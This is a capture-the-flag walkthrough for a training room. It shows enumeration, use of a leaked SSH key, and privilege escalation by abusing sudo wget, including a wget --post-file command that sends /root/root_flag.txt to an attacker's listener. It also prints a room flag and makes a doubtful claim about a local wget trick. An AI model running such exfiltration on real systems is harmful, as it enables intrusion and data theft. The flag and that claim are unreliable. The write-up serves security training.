## TryHackMe: Wgel CTF Writeup
A detailed walkthrough for the Wgel CTF room on TryHackMe, demonstrating enumeration, sensitive file discovery via hidden directories, and privilege escalation using wget.
## Room Information

* Room Link: [Wgel CTF](https://tryhackme.com/room/wgelctf)
* Difficulty: Easy
* Target IP: 10.130.145.104

------------------------------
## Phase 1: Enumeration & Reconnaissance
## 1. Nmap Network Scan
We start by scanning the target IP address to identify active network ports and running services:

nmap -sC -sV 10.130.145.104

Scan Results:

* Port 22/tcp: Open | SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
* Port 80/tcp: Open | HTTP | Apache httpd 2.4.18
<img width="778" height="671" alt="Screenshot_2026-09-05_09-13-53" src="https://github.com/user-attachments/assets/5b24c471-eabf-4768-90b6-57d9c91aa192" />

## 2. Web Application Assessment (Port 80)
Visiting http://10.130.145.104 displays the standard Apache2 Ubuntu Default Page.
<img width="1280" height="718" alt="Screenshot_2026-09-05_10-07-53" src="https://github.com/user-attachments/assets/e7731dd3-d4e2-45ea-857b-44f46ddd5ff6" />

Inspecting the HTML Source Code (Ctrl + U) reveals a critical comment pointing to an internal user:

<!-- Jessie don't forget to udate the webiste -->


* Discovered Username: jessie
<img width="1121" height="710" alt="Screenshot_2026-09-05_10-08-21" src="https://github.com/user-attachments/assets/f96565b2-e91d-4bfd-8b7a-f22cd97d3eb7" />

------------------------------
## Phase 2: Vulnerability Discovery & Directory Brute-Forcing
## 1. Initial Directory Scan
Since the home page lacked interactive content, we brute-forced directories using gobuster:

gobuster dir -u http://10.130.145.104 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

<img width="1272" height="509" alt="Screenshot_2026-09-05_13-07-03" src="https://github.com/user-attachments/assets/827b24fa-7b04-41d9-8678-47c84b0410ff" />

* Result Found: /sitemap/ (Status: 301)

## 2. Advanced Hidden Directory Enumeration
To find components hidden beneath the /sitemap/ path, we performed a prefix scan targeting potentially hidden infrastructure files using SecLists:

gobuster dir -u http://10.130.145.104 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt

<img width="949" height="619" alt="Screenshot_2026-09-05_13-07-46" src="https://github.com/user-attachments/assets/4e1616ad-d77f-42e1-99cf-4314cc7711dc" />

* Result Found: An exposed directory footprint indicated standard components. Given that SSH (Port 22) is open on the server, we strategically guessed and successfully verified the presence of an unprotected .ssh directory at http://10.130.145.104/sitemap/
<img width="729" height="544" alt="Screenshot_2026-09-05_10-53-15" src="https://github.com/user-attachments/assets/cc3180d8-dba3-4719-9a7e-44c0e24e7ec9" />

Inside this directory, we located a leaked SSH Private Key: id_rsa.
------------------------------
## Phase 3: Exploitation & Initial Access
## 1. Preparing the Private Key
<img width="861" height="698" alt="Screenshot_2026-09-05_10-53-51" src="https://github.com/user-attachments/assets/5d86aa5a-e930-4b6c-b09b-907d9193a437" />

We copied the private key contents into a local file named rsa on our Kali machine. Before attempting connection, we restricted file permissions to comply with client security restrictions:

chmod 600 rsa

## 2. Establishing SSH Session
Using the private key and our previously discovered username (jessie), we authenticated to the host machine:
<img width="722" height="252" alt="Screenshot_2026-09-05_10-56-10" src="https://github.com/user-attachments/assets/f4c4bbfa-d10d-4d67-8762-9d3096e68aa6" />

ssh -i rsa jessie@10.130.145.104
<img width="1003" height="600" alt="Screenshot_2026-09-05_11-05-38" src="https://github.com/user-attachments/assets/01edca23-ba84-42ea-ab8a-f75e3f5d2075" />

## 3. Retrieving User Flag
Once inside jessie's environment, we checked file locations to secure the user token:

locate user_flag.txt
cat /home/jessie/Documents/user_flag.txt

<img width="837" height="199" alt="Screenshot_2026-09-05_13-17-11" src="https://github.com/user-attachments/assets/1f6fa562-9c56-4ca9-9e13-4c32f9230964" />

* User Flag: 057c67131c3d5e42dd5cd3075b198ff6

------------------------------
## Phase 4: Privilege Escalation (Root Access)
## 1. Evaluating Sudo Configuration
We executed sudo -l to analyze what system binaries could be initiated with higher operational contexts:

User jessie may run the following commands on CorpOne:
    (root) NOPASSWD: /usr/bin/wget

<img width="843" height="153" alt="Screenshot_2026-09-05_13-27-01" src="https://github.com/user-attachments/assets/575e4475-1d01-4b17-9d3e-11a2c5480da0" />

* Vector: jessie can run /usr/bin/wget with administrative privileges without a password requirement.

## 2. Arbitrary File Exfiltration via Wget
Because wget can transfer arbitrary files via HTTP POST payloads, we can manipulate it to push the root flag back to our host machine.

   1. On the Kali Attacker Machine, find the VPN IP (tun0) and initiate a Netcat listener:
   
   nc -lvnp 4444
   
   2. On the Target Host Terminal (jessie), fire the file contents through wget pointing back to the listener IP:
   
   sudo /usr/bin/wget --post-file=/root/root_flag.txt http://<YOUR_KALI_VPN_IP>:4444
   
   <img width="875" height="179" alt="Screenshot_2026-09-05_13-28-32" src="https://github.com/user-attachments/assets/f393b769-2541-41b2-a24b-678546d52464" />

The data stream hits our listener interface, revealing the full contents of the root flag file.
<img width="1018" height="520" alt="Screenshot_2026-09-05_11-24-39" src="https://github.com/user-attachments/assets/28f71e92-2459-45df-9991-dbd991c71a6f" />

Alternative Local Method (No Listener Required):

sudo /usr/bin/wget --post-file=/root/root_flag.txt http://127.0.0.1:9999

This connection attempt immediately errors out locally, printing out the payload structure directly to the active screen terminal before exit.
------------------------------
Flag Submissions Completed Successfully! 🏁
